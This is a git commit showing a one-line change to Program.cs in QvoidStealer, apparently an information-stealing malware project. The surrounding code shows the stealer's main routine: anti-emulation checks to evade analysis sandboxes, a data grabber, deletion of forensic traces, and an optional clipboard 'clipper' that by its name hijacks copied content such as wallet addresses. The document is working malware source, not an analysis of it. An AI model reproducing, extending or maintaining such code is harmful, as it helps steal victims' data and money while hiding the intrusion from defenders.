476caf939ea273ecf1e9912b4a2f7a4603ad2329
Yenon <84099739+Enum0x539@users.noreply.github.com>
2022-06-13 16:44:46 +0000

    Update Program.cs

--- QvoidStealer/QvoidStealer/Program.cs
+++ QvoidStealer/QvoidStealer/Program.cs
@@ -25,7 +25,7 @@ namespace QvoidStealer
                 Protection.Emulation(Settings.AntiEmulation);
 
                 Grabber.Initialize(args);
-                Grabber.DeleteTraces(false, true);
+                Grabber.DeleteTraces(false, false);
 
                 if (Settings.Clipper.Enabled)
                     Settings.Clipper.Start();
